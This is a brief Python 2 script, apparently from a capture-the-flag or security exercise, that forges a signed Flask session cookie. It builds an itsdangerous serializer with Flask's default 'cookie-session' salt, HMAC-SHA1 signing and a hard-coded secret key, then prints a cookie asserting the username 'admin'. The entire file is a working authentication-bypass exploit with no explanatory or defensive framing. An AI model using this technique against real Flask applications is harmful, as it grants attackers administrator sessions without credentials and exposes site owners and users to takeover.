from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer
import hashlib

salt = 'cookie-session'
digest_method = hashlib.sha1
key_derivation = 'hmac'
serializer = TaggedJSONSerializer()
secret_key = b'\x88\xef\x99\x95A_\x8fo~\x07:\t\x8e\x90t\x07\x96\xc8\xaf\xd8'
signer_kwargs = dict(key_derivation=key_derivation, digest_method=digest_method)
s = URLSafeTimedSerializer(secret_key, salt, serializer=serializer, signer_kwargs=signer_kwargs)

print s.dumps({u'username':u'admin'})
